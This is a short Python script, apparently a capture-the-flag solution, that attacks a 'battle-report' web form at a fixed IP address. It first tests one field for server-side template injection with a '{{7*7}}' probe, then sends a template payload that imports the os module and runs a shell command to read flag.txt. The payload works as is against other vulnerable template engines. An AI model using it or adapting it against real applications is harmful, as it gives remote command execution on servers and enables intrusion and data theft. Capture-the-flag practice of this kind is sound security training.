import requests

URL = "http://94.237.57.7:33139/battle-report"

payload_test = {
    "damage_dealt": "{{7*7}}",
    "damage_taken": "0",
    "spells_cast": "0",
    "turns_survived": "0",
    "outcome": "victory"
}

response = requests.post(URL, data=payload_test)
if "49" in response.text:
    print("✅ SSTI hoạt động! Tiến hành khai thác...")
    
    payload_exploit = {
        "damage_dealt": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}",
        "damage_taken": "0",
        "spells_cast": "0",
        "turns_survived": "0",
        "outcome": "victory"
    }
    
    response = requests.post(URL, data=payload_exploit)
    print("🚩 Flag:", response.text)
else:
    print("❌ SSTI không hoạt động, cần thử phương pháp khác.")